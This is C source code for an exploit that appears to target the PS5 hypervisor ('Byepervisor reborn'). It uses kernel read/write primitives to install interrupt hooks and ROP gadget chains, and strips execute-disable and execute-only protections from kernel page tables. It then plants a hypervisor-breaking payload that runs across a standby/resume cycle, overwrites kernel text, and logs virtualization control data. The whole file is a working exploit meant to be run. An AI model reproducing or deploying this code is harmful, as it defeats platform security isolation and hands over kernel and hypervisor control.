#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/mman.h>

#include <ps5/kernel.h>
#include <sys/syscall.h>

#include "kdlsym.h"
#include "khook.h"
#include "util.h"
#include "paging.h"

#include "break_hv_payload/break_hv.h"

#define STATE_ARMED               0x4B484F4F4B454401ULL
#define COOKIE_VAL                0xCAFE133741414141ULL
#define HOOK_CORE                 0
#define HOOK_IST                  6
#define CAVE_STATE_OFF            0x600
#define CAVE_SAVE_OFF             0x620
#define TSS_STRIDE                0x68
#define STARTUP_MP_PAYLOAD_PAGE   0x3FFFF000

#define HV_LOADER_PA_REGULAR      0x062800000
#define HV_LOADER_PA_PRO          0x8e0800000

uint64_t g_hv_base_pa;
int sceSystemStateMgrEnterStandby(void);

static int install_test_hook(int core_id, uint64_t cave)
{
  khook_t    hook;
  kh_chain_t chain;
  uint8_t    chain_buf[0x400];
  int        ret;

  printf("[+] install_test_hook addr = %p\n", &install_test_hook);

  ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (ret) return ret;

  hook.tss_stride      = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.oneshot   = 1;

  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE);
  kh_set_resume_rax(&hook, 0x12345678);

  uint64_t oracle = kh_user_data_addr(&hook);
  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, COOKIE_VAL);

  ret = kh_install(&hook, &chain);
  if (ret) return ret;

  kh_trigger(&hook);

  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
  return 0;
}

static int install_resume_hook(int core_id, uint64_t cave, uint64_t cr3)
{
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x800];
  uint64_t set_rsi;
  uint64_t oracle;
  int ret;

  ret = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (ret) return ret;

  hook.tss_stride      = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.oneshot   = 1;

  set_rsi = kdldmap(STARTUP_MP_PAYLOAD_PAGE);

  printf("[+] install_resume_hook: setting hook target = 0x%lx (base: 0x%lx), set rsi=0x%lx\n", kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL), ktext(0), set_rsi);
  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
  kh_set_resume_rsi(&hook, set_rsi);
  kh_set_resume_rdx(&hook, cr3);

  oracle = kh_user_data_addr(&hook);
  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, COOKIE_VAL);

  kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
  kh_chain_q(&chain, cr3);

  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(&chain, oracle + 0x08);
  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RDX);

  kh_chain_memcpy(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE), kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, 0xF00);

  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF00), kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF08), kdldmap(0));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF10), oracle);

  if (g_hv_base_pa == HV_LOADER_PA_PRO)
    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa - 0x800000);
  else
    kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), g_hv_base_pa);

  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20), g_hv_base_pa + rawoff(HV_SYM_HEAP_BASE));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28), g_hv_base_pa + rawoff(HV_SYM_PCPUS));

  ret = kh_install(&hook, &chain);
  if (ret) return ret;

  kh_trigger(&hook);

  kwrite64(cave + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave + CAVE_SAVE_OFF + 0x10, hook.saved_ist);
  kwrite64(cave + CAVE_STATE_OFF, STATE_ARMED);
  return 0;
}

static void uninstall_hook(int core_id, uint64_t cave)
{
  khook_t hook;
  kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY), kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, core_id);
  hook.saved_gate_lo = kread64(cave + CAVE_SAVE_OFF + 0x00);
  hook.saved_gate_hi = kread64(cave + CAVE_SAVE_OFF + 0x08);
  hook.saved_ist     = kread64(cave + CAVE_SAVE_OFF + 0x10);
  hook.installed     = 1;
  kh_disarm(&hook);
  kh_restore(&hook);
  kwrite64(cave + CAVE_STATE_OFF, 0);
}

int main(void)
{
  uint64_t test_val;
  uint8_t *test_val_bytes;

  uint32_t fw;
  uint64_t cave;
  uint64_t oracle;
  uint64_t kernel_pmap;
  uint64_t kernel_pm_cr3;
  uint64_t pml4e_addr;
  uint64_t pdpe_addr;
  uint64_t pte_addr;
  uint64_t pde_addr;
  uint64_t pml4e;
  uint64_t pdpe;
  uint64_t pde;
  uint64_t pte;
  uint64_t o;

  printf("[+] Byepervisor reborn v1\n");

  fw = kernel_get_fw_version();
  printf("[+] Detected firmware: %x.%02x\n", (fw & 0xFF000000) >> 0x18, (fw & 0x00FF0000) >> 0x10);

  if (kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL) == 0) {
    printf("[!] Undetected firmware, exiting!\n");
    notifyf("[ERROR] Byepervisor Reborn\nFirmware is not supported :(\n");
  }

  int soc_id = sceKernelGetMainSocId();
  if (soc_id == 0x840fd0) {
    g_hv_base_pa = HV_LOADER_PA_PRO;
    printf("[+] Pro model detected, HV loader PA = 0x%lx\n", g_hv_base_pa);
    notifyf("Byepervisor Reborn\nDetected pro model (0x%x)\n", soc_id);
  } else {
    g_hv_base_pa = HV_LOADER_PA_REGULAR;
    printf("[+] Regular model detected, HV loader PA = 0x%lx\n", g_hv_base_pa);
    notifyf("Byepervisor Reborn\nDetected regular model (0x%x)\n", soc_id);
  }

  kernel_set_ucred_authid(getpid(), 0x4800000000000007);

  cave   = kdlsym(KERNEL_SYM_DATA_CAVE);
  oracle = cave + KH_OFF_USER;

  pin_to_core(HOOK_CORE);

#define DEBUG_MP_STARTUP_PAYLOAD 0
#if DEBUG_MP_STARTUP_PAYLOAD == 0
  if (kread64(oracle) != 0) {
    printf("Hypervisor is already compromised\n");
    printf("Here's a dump of kernel .text base (xotext defeated)!\n");
    kHexDump(ktext(0), 0x60);

    printf("Here's a dump of some HV strings (hvcore+0x19830)!\n");
    kHexDump(kdldmap(g_hv_base_pa + 0x72830), 0x60);

    kwrite64(ktext(8), 0x41414141);

    printf("Edited kernel .text\n");
    kHexDump(ktext(0), 0x60);

    test_val = kread64(ktext(0));
    test_val_bytes = (uint8_t *) &test_val;
    notifyf("Byepervisor - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x",
      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3],
      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);

    return 0;
  }
#endif

#if defined(KHOOK_TEST)
  int ret;

  ret = install_test_hook(HOOK_CORE, cave);
  printf("installed test khook = %d\n", ret);

  printf("1\n");
  sceKernelSleep(1);

  kwrite64(oracle, 0);
  printf("2\n");
  sceKernelSleep(1);

  pin_to_core(HOOK_CORE);
  printf("core = %d\n", get_cpu_core());

  ret = syscall(SYS_getuid);

  o = kread64(oracle);
  printf("test khook oracle=0x%lx (ret = 0x%x)\n", o, ret);
  kwrite64(oracle, 0);
  sceKernelSleep(1);

  ret = syscall(SYS_getuid);

  o = kread64(oracle);
  printf("test khook oracle=0x%lx (ret = 0x%x)\n", o, ret);

  sceKernelSleep(1);

  uninstall_hook(HOOK_CORE, cave);
  notifyf("uninstalled test khook\n");
  return 0;

#else

  kwrite(kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, break_hv, break_hv_len);

  kernel_pmap   = kdlsym(KERNEL_SYM_PMAP_STORE);
  kernel_pm_cr3 = kread64(kernel_pmap + 0x28);

  pml4e_addr = find_pml4e(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pml4e);
  CLEAR_PDE_BIT(pml4e, EXECUTE_DISABLE);
  kwrite64(pml4e_addr, pml4e);

  pdpe_addr = find_pdpe(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pdpe);
  CLEAR_PDE_BIT(pdpe, EXECUTE_DISABLE);
  kwrite64(pdpe_addr, pdpe);

  if (PDE_FIELD(pdpe, PS) != 1) {
    pde_addr = find_pde(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pde);
    CLEAR_PDE_BIT(pde, EXECUTE_DISABLE);
    kwrite64(pde_addr, pde);

    if (PDE_FIELD(pde, PS) != 1) {
      pte_addr = find_pte(kernel_pmap, kdldmap(STARTUP_MP_PAYLOAD_PAGE), &pte);
      CLEAR_PDE_BIT(pte, EXECUTE_DISABLE);
      kwrite64(pte_addr, pte);
    }
  }

  printf("[+] Disabling xotext + enabling write...\n");
  for (uint64_t addr = ktext(0); addr < KERNEL_ADDRESS_DATA_BASE; addr += 0x1000) {
    pde_addr = find_pde(kernel_pmap, addr, &pde);
    if (pde_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pde, XOTEXT);
      SET_PDE_BIT(pde, RW);
      kwrite64(pde_addr, pde);
    }

    pte_addr = find_pte(kernel_pmap, addr, &pte);
    if (pte_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(pte, XOTEXT);
      SET_PDE_BIT(pte, RW);
      kwrite64(pte_addr, pte);
    }
  }

  printf("[+] Installing hook...\n");
  if (kread64(cave + CAVE_STATE_OFF) != STATE_ARMED) {
    int r = install_resume_hook(HOOK_CORE, cave, kernel_pm_cr3);
    if (r) {
      printf("[!] Failed to install hook (likely too large)\n");
      notifyf("[ERROR] Byepervisor Reborn\nHook install failed :(");
      return r;
    }

    printf("[+] Hook installed, enter sleep and resume!\n");
    notifyf("Byepervisor Reborn\nEntering rest mode in 3 secs\n");
    sleep(3);
    sceSystemStateMgrEnterStandby();
  } else {
    printf("khook: hook already ARMED (state survived)\n");
  }

  for (;;) {
    pin_to_core(HOOK_CORE);

    o = kread64(oracle);
    if (o != 0) {
      notifyf("Byepervisor Reborn\nWelcome back, hypervisor is defeated!\nCookie? 0x%lx", o);

      printf("[+] Uninstalling hook\n");
      uninstall_hook(HOOK_CORE, cave);

      test_val = kread64(ktext(0));
      test_val_bytes = (uint8_t *) &test_val;
      notifyf("Byepervisor Reborn - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x",
      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3],
      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);

      {
        const char *paths[2] = { "/data/byepervisor-1240.txt", "/data/logfetch.txt" };
        volatile uint64_t *out = (volatile uint64_t *)(uintptr_t)oracle;
        int pi;
        for (pi = 0; pi < 2; pi++) {
          FILE *f = fopen(paths[pi], pi ? "a" : "w");
          if (!f) continue;
          fprintf(f, "=== byepervisor: hypervisor defeated ===\n");
          fprintf(f, "cookie=%#llx\n", (unsigned long long)o);
          fprintf(f, "text_first_qword=%#llx\n", (unsigned long long)test_val);
          fprintf(f, "vmcb_pa=%#llx\n", (unsigned long long)out[1]);
          fprintf(f, "nested_ctrl_before=%#llx\n", (unsigned long long)out[2]);
          fprintf(f, "asid=%llu\n", (unsigned long long)out[3]);
          fprintf(f, "nested_cr3=%#llx\n", (unsigned long long)out[4]);
          fprintf(f, "iopm=%#llx\n", (unsigned long long)out[5]);
          fprintf(f, "msrpm=%#llx\n", (unsigned long long)out[6]);
          fprintf(f, "core=%llu\n", (unsigned long long)out[7]);
          fclose(f);
        }
      }

      return 0;
    }

    {
      const char *paths[2] = { "/data/byepervisor-1240.txt", "/data/logfetch.txt" };
      volatile uint64_t *out = (volatile uint64_t *)(uintptr_t)oracle;
      int pi;
      for (pi = 0; pi < 2; pi++) {
        FILE *f = fopen(paths[pi], pi ? "a" : "w");
        if (!f) continue;
        fprintf(f, "stage=waiting cookie=%#llx\n", (unsigned long long)o);
        fprintf(f, "vmcb_pa=%#llx nctl=%#llx asid=%llu\n",
                (unsigned long long)out[1], (unsigned long long)out[2],
                (unsigned long long)out[3]);
        fprintf(f, "nested_cr3=%#llx iopm=%#llx msrpm=%#llx core=%llu\n",
                (unsigned long long)out[4], (unsigned long long)out[5],
                (unsigned long long)out[6], (unsigned long long)out[7]);
        fclose(f);
      }
    }
    sceKernelSleep(5);
  }
  return 0;
#endif
}
